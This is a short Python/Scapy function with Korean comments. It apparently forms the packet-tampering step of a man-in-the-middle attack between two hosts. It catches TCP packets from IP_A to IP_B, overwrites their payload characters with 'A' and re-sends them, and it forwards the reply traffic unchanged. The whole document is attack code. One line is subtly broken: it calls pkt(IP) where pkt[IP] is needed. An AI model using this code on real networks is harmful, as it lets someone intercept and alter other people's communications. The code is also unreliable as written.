# 이 코드는 네트워크 패킷을 가로채고 변조한다.
# 특정 조건에 맞는 IP 패킷을 감지하고, 해당 패킷을 변조한 후 다시 전송한다.

def spoof_pkt(pkt):
    # IP_A , IP_B 와 관련된 패킷인지 확인을 한다.
    
    # 여기에서는 출발지 주소가 IP_A 이면서 목적지가 IP_B 인 경우
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:

        # 패킷 변조
        # IP 패킷을 복사
        newpkt = IP(bytes(pkt(IP)))
        # 패킷의 체크섬 필드 삭제
        del(newpkt.chksum)
        # TCP 패킷의 페이로드 삭제
        del(newpkt[TCP].payload)
        # TCP 패킷의 체크섬 삭제
        del(newpkt[TCP].chksum)

        # 기존 TCP 패킷에 페이로드가 존재했다면 페이로드를 변조하여 새로운 데이터를 생성한다.
        if pkt[TCP].payload:
            # 기존 페이로드의 데이터를 가져온다.
            data = pkt[TCP].payload.load
            # 새로운 데이터로 변조한다. (페이로드의 문자를 "A" 로 대체)
            newdata = re.sub(r'[0-9a-zA-Z]' , r'A', data.decode())
            send(newpkt/newdata)
        else:
            send(newpkt)
    
    # 여기에서는 출발지 주소가 IP_B 이면서 목적지가 IP_A 인 경우
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)